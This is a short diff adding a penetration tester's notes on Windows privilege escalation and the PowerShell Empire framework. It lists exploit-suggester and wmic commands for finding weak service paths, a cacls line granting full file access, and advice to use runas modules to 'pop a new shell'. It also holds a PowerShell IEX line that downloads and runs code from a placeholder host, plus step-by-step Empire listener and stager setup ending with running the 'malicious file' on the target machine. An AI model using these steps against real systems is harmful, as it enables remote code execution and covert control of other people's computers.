@@ -1,0 +1,83 @@
+PRIVILEGE-ESCALATION-WINDOWS - AND EMPIR
+windows-exploit-suggester.py --update
+
+windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
+
+windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext 'windows server 2008 r2' 
+
+unquoted service paths
+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+cacls <file.txt> /t /e /p UserName:F   <---Give a user readership of a file through an ACL
+
+
+Use powershell/management/runas in Empire or post/windows/manage/run_as in Metasploit if you have creds, in order to pop a new shell.
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://badshit.com')
+Powershell Empire
+
+
+---
+Quick and dirty
+
+./empire
+uselistener http
+set Host <your host>
+execute
+usestager multi/launcher
+set Listener http
+generate
+
+
+Edit the install.sh and change all pip install commands to pip2 install
+
+run ./install.sh 
+
+set up should complete
+
+----
+
+Set up Listener
+
+type in "listener" to the main menu
+
+type in "uselistener <listener type>" 
+
+Type in "execute" in order to start the listener
+
+-----
+
+Set up stager
+
+from anywhere type "usestager windows/launcher_bat"
+
+from stager prompt, type "set Listener <listener name>"
+
+Now type "generate" this will make your payload and place it in the tmp directory
+
+------
+
+Now take the malicious file or command and run it on the windows machine
+
+Type in "listeners" to see active listener
+
+Type in "interact <name of listener>"
+
+once interacted with the listener type "rename <name you want>"
+
+interact <agent name> **interacts with active session
+
+once inside of agent you can do the following
+
+usemodule <module name>
+
+
+
+
+-----------------------
+
+SANS cheatsheet
+
+
+
